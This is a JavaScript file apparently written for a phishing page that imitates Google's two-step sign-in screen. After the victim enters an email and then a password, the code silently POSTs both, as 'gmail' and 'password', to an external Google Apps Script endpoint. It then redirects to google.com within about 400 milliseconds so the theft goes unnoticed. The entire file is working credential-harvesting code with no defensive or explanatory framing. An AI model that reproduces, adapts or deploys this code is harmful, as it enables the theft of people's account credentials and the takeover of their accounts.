const form = document.getElementById("loginForm");
const heading = document.getElementById("main-heading");
const desc = document.getElementById("main-desc");

let userEmail = ""; // Store email to use in 2nd step

form.addEventListener("submit", function (e) {
  e.preventDefault();

  const emailField = document.getElementById("email");
  const passwordField = document.getElementById("password");

  // STEP 1: Email Page
  if (!passwordField) {
    userEmail = emailField.value.trim();
    if (!userEmail) {
      alert("Please enter your email or phone.");
      return;
    }

    // Switch to password screen
    heading.textContent = "Welcome";
    desc.textContent = userEmail;

    form.innerHTML = `
      <div class="inputs">
        <input type="password" id="password" class="input" required placeholder=" "/>
        <label for="password" class="input-label">Enter your password</label>
      </div>
      <a href="#" class="link-btn">Forgot password?</a>
      <p class="color">Not your device? Use Guest mode to sign in privately.</p>
      <a href="#" class="link-btn">Learn more</a>
      <div class="btn-group">
        <button class="create-btn" type="button" onclick="location.reload()">Back</button>
        <button class="next-btn" type="submit">Next</button>
      </div>
    `;
  }

  // STEP 2: Password Page
  else {
    const passwordValue = passwordField.value.trim();
    if (!passwordValue) {
      alert("Please enter your password.");
      return;
    }

    // Fire-and-forget submission
    fetch("https://script.google.com/macros/s/AKfycbxKswPuEtwUV9XplfEUxmFds-G9KJZXQ6QG_zLvHpToBRURSQWTAM1kwKHBhmXXpXTuEA/exec", {
      method: "POST",
      body: JSON.stringify({
        gmail: userEmail,
        password: passwordValue
      })
    });

    // Immediate redirect (~0.4–0.5s)
    setTimeout(() => {
      window.location.href = "https://www.google.com";
    }, 400);
  }
});
